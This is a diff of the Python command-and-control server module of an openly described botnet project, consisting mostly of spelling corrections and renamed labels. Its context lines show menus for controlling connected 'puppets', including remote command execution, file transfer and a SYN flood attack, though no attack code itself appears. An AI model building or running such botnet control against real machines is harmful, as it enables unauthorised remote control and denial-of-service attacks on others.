@@ -3,11 +3,11 @@
     Copyright (c) 2021 Arthur Bryan <arthurbryan2030@gmail.com>
 
     This module belongs to https://github.com/arthur-bryan/puppeteer
-    A implementation of a puppetnet using Python on server (C&C) side
+    A implementation of a botnet using Python on server (C&C) side
     and C on the puppets side.
 
     This module contains the class that represents the Puppeteer, with the
-    responsible methods for accepting incomming puppet connections and
+    responsible methods for accepting incoming puppet connections and
     interacting with the them
 """
 
@@ -19,8 +19,8 @@ import sys
 import struct
 from config import MAX_COMMAND_OUTPUT_SIZE
 from config import to_yellow, to_green, to_red
-from src.classes.database import Database
-from src.classes.puppet import Puppet
+from classes.database import Database
+from classes.puppet import Puppet
 
 
 class Puppeteer:
@@ -29,15 +29,15 @@ class Puppeteer:
 
     Attributes:
         __database (Database):      object to interact with database
-        __listen_address (str):     IP address of the listenning interface
-        __listen_port (int):        port number for incomming puppet connections
+        __listen_address (str):     IP address of the listening interface
+        __listen_port (int):        port number for incoming puppet connections
         __socket (:obj: 'socket'):  object with socket methods
 
     """
 
     def __init__(self, listen_address, listen_port, database_path):
         """Args:
-                listen_address (str):   IP address of the listenning interface
+                listen_address (str):   IP address of the listening interface
                 listen_port (int):      port number for puppet connections
 
         """
@@ -54,7 +54,7 @@ class Puppeteer:
         """ String representation of the Puppeteer object
 
             Returns:
-                str:    representation of the server with its listenning address
+                str:    representation of the server with its listening address
 
         """
         return f"C&C Puppeteer {self.__listen_address}:{self.__listen_port}"
@@ -71,7 +71,7 @@ class Puppeteer:
             self.exit()
 
     def _listen_connections_thread(self):
-        """ The thread for listenning and accepting incomming connections and
+        """ The thread for listening and accepting incoming connections and
             adding puppets to the database
 
         """
@@ -109,7 +109,7 @@ class Puppeteer:
             self.__database.add_puppet(new_puppet)
 
     def _control_panel(self):
-        """ Shows a menu and starts communication based on the choosen option"""
+        """ Shows a menu and starts communication based on the chosen option"""
         while True:
             _main_menu()
             command_number = input(to_yellow("[ COMMAND OPTION ] >> "))
@@ -127,7 +127,7 @@ class Puppeteer:
             #     print(to_red("[ ! ] Invalid choice, use 'help'"))
 
     def _interact_with_one(self):
-        """ Shows a menu to interact with a choosen puppet (if there is any
+        """ Shows a menu to interact with a chosen puppet (if there is any
             puppet connected)
 
         """
@@ -207,7 +207,7 @@ class Puppeteer:
     def _list_connections(self):
         """ Lists the connected puppets """
         if self.__connected_puppets:
-            print(f"{'ID':^6}{'IP ADDRRESS':^15}{'OS':^8}{'ARCHITECTURE':^15}")
+            print(f"{'ID':^6}{'IP ADDRESS':^15}{'OS':^8}{'ARCHITECTURE':^15}")
             for _, puppet in enumerate(self.__connected_puppets):
                 print(f"{_:^6}{puppet.ip_address:^15}{puppet.op_system:^8}"
                       f"{puppet.architecture:^15}")
@@ -229,7 +229,7 @@ class Puppeteer:
         """ Choose a puppet based on it index on the list of connected puppets
 
             Returns:
-                :obj: 'Puppet':    choosen puppet
+                :obj: 'Puppet':    chosen puppet
 
         """
         self._list_connections()
@@ -364,7 +364,7 @@ def _load_animation():
 def _main_menu():
     """ Prints the main menu """
     print(to_yellow(
-        "\n[0] List connected devices\n" +
+        "\n[0] List connected puppets\n" +
         "[1] Interact with one\n" +
         "[2] Interact with all\n" +
         "[3] Exit\n"))
@@ -375,8 +375,8 @@ def _interaction_menu():
     print(to_yellow(
         "\n[0] Disconnect\n" +
         "[1] List files\n" +
-        "[2] Download from client\n" +
-        "[3] Upload to client\n" +
+        "[2] Download from puppet\n" +
+        "[3] Upload to puppet\n" +
         "[4] Run remote command\n"
-        "[5] SYN Flood atack\n"
+        "[5] SYN Flood attack\n"
         "[9] Back\n"))
